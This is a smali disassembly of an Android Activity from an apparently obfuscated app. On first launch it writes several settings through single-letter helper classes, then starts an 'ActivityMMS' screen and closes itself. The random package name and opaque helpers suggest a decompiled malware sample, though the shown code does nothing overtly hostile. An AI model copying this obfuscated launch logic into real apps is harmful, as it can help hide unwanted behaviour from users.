.class public Luvrddw/yosszi/momdkk/Activity1;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    const/4 v4, 0x0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f040001

    invoke-virtual {p0, v0}, Luvrddw/yosszi/momdkk/Activity1;->setContentView(I)V

    invoke-virtual {p0}, Luvrddw/yosszi/momdkk/Activity1;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "1"

    invoke-static {}, Ly;->a()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lj;->d:Ljava/lang/String;

    invoke-static {v0, v1, v2, v3}, Ly;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v0}, Lu;->a(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_0

    sget-object v1, Lj;->k:Ljava/lang/String;

    sget-object v2, Lj;->a:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Ly;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Lj;->l:Ljava/lang/String;

    sget-object v2, Lj;->b:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Ly;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Lj;->m:Ljava/lang/String;

    invoke-static {v0, v1, v4}, Ly;->a(Landroid/content/Context;Ljava/lang/String;I)V

    sget-object v1, Lj;->az:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Ly;->a(Landroid/content/Context;Ljava/lang/String;I)V

    sget-object v1, Lj;->aM:Ljava/lang/String;

    invoke-static {v0, v1, v4}, Ly;->a(Landroid/content/Context;Ljava/lang/String;I)V

    invoke-static {v0}, Lu;->b(Landroid/content/Context;)V

    invoke-static {v0}, Lu;->d(Landroid/content/Context;)V

    invoke-static {v0}, Lu;->f(Landroid/content/Context;)V

    invoke-static {v0}, Lu;->e(Landroid/content/Context;)V

    invoke-static {v0}, Lu;->c(Landroid/content/Context;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Luvrddw/yosszi/momdkk/ActivityMMS;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Luvrddw/yosszi/momdkk/Activity1;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Luvrddw/yosszi/momdkk/Activity1;->finish()V

    :cond_0
    return-void
.end method
